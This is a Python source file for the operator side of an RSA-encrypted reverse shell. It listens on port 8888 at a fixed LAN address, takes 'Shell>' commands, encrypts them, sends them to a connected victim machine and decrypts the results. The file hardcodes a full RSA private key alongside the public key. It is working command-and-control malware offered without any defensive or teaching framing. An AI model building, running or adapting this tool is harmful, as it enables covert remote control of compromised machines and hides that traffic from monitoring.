import socket
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP

def encrypt(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAsEF8wKmM/PgwtmTColaK
S952gCVEDucB74WVsoJZ0crO5eVNliCZZRqwuH3FJo/LEZE8Kr+n9B07fD2SdGNX
f0Ur+km53ZKXcb89zuohwlK7hizIfzh6eAvV71IpvhVU4qr45hrqP+Ha6toThYm/
Xa7G8W65JmfCUtMCdYuute5QJJUTkGTkpt8dZ0Szdf5u2dz4KhpX2Lw9eeEDOPeP
xBiJzPRlTTnkHfjX0nnydhIKFLSJ2Up4AEVqCnm7LWltYNcEo6epcWiL3F2KtRr9
rVDs2FGe3jzu7WX9MyQIzKRQ9S7QM2k2zaLa6gdllLt6YBkNEHNE2DrVv72Pv1d2
WUq6r+9hreSSOCbzolmErPI9ljIi4XgMEbxaqf4gRhLCqnxtsXRiy+jMQ0rggjUa
8IEL61wuOMZwmjmeycE/RjOJW3xnt0QbANLY1y3abaQbgXhMwEhJzHH3QE2zm1Bc
4VLqk2vKmDQ/oYDs8FCCwUd5KivmK96lF4QXySlqST9XBYkqv1DXP1KXxMbWJiI1
5Rof/KwTwylpJI2pFXaGUL++8hqO7qtzF5GV5XAXH908l48efwCkowV+dWoSHiit
e3TJUTVxS32mx7qLLBB/dVmD4nJmbuJ5rTWWk/sNZZi4ioEU+EX3sZB4KQy6DaR7
tjoyPX6PpDXUoUg4dHFy0MkCAwEAAQ==
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData

def decrypt(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'''
    private_key = RSA.importKey(privatekey)
    decryptor = PKCS1_OAEP.new(private_key)
    dec = decryptor.decrypt(cipher)
    return dec.decode()

def connecting():
    s = socket.socket()
    s.bind(("192.168.46.128",8888))
    s.listen(1)
    print ('[+] Listening for income TCP coonection on port 8888')
    conn , addr = s.accept()
    print ('[+] we got a connection from', addr)

    while True:
        store = ''
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            result = conn.recv(1024)
            try:
                print(decrypt(result))
            except:
                print("[-] unable to decrypt/receive data!")

def main():
    connecting()
main()
